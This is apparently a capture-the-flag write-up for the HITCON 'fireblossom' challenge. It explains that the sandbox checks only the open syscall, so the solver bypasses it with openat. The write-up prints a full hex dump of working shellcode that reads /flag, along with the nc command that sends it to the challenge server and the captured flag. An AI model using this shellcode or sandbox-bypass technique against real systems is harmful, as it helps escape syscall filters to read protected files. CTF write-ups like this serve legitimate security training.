# fireblossom (misc 150)

there were 2 files provided

fireblossom: for setting up a jail + sandbox, then runs fireblossom-claypot

fireblossom-claypot: for executing your shellcode

fireblossom debugs fireblossom-claypot, checking that whenever the open syscall

is executed, the file being read is not "/flag"

to bypass this, we use the openat syscall instead
```
$ xxd a
0000000: 6a00 4159 49bc ffff ffff ffff ffff 4154  j.AYI.........AT
0000010: 4158 6a22 415a 6a07 5a68 0010 0000 5e68  AXj"AZj.Zh....^h
0000020: 0000 4141 5f6a 0958 0f05 49bc 2f66 6c61  ..AA_j.X..I./fla
0000030: 6700 0000 4154 545e 6a00 596a 005a 49bc  g...ATT^j.Yj.ZI.
0000040: 9cff ffff 0000 0000 4154 5f68 0101 0000  ........AT_h....
0000050: 580f 0550 5f68 0000 4141 5e6a 405a 6a00  X..P_h..AA^j@Zj.
0000060: 580f 056a 025f 6800 0041 415e 6a40 5a6a  X..j._h..AA^j@Zj
0000070: 0158 0f05 0a                             .X...
$ cat a | nc 52.69.206.114 10002
Put seeds into the clay pot
hitcon{P4race Ist T0t, 2A1d F1rebl0$soM}
The fireblossom is blooming
```
